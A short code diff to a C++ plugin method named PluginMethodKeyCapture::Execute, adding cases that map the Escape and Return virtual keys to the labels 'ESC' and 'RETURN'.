@@ -230,6 +230,10 @@ void PluginMethodKeyCapture::Execute() {
 				chars_ws = L"F11";
 			else if (vkey == VK_F12)
 				chars_ws = L"F12";
+			else if (vkey == VK_ESCAPE)
+				chars_ws = L"ESC";
+			else if (vkey == VK_RETURN)
+				chars_ws = L"RETURN";
 			else {
 				//UINT vkey = MapVirtualKeyEx(keyboard.GetData().VKey, MAPVK_VK_TO_CHAR, layout);
 				std::vector<BYTE> keys(256, 0);
